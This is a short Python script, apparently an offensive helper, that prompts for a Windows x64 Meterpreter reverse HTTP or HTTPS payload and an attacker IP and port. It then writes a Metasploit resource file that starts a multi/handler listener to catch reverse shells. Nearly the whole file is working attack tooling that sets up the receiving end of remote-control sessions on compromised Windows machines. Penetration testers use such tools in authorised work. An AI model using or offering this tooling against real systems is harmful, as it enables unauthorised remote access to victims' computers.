#! usr/bin/env python3

import os

class msfvenom_payload_create:

    def __init__(self):
        print('[1]', 'win_x64_rev_http')
        print('[2]', 'win_x64_rev_https')
        print('-----------------------------------------------')
        self.msf_payload_choose = input('what payload do you want to choose ?:\n>>>')
        self.IP   = input('Your IP >>> ')
        self.port = input ("port >>> ")

    def payload(self):
        http  = "windows/x64/meterpreter/reverse_http"
        https = "windows/x64/meterpreter/reverse_https"
        if self.msf_payload_choose == '1':
            return http
        elif self.msf_payload_choose == '2':
            return https

    def outputpath(self):
        path = '/'.join((os.getcwd(),'temp/'))
        return path

    def generate_msfconsole_rc(self):
        with open ("/".join([os.getcwd(),'output','msfconole.rc']),'w') as msfconsole:
            msfconsole.write('\n'.join(['use exploit/multi/handler',
                                        'set PAYLOAD %s' %self.payload(),
                                        'set LHOST %s' %self.IP,
                                        'set LPORT %s' %self.port,
                                        'exploit -j',
                                        ]))
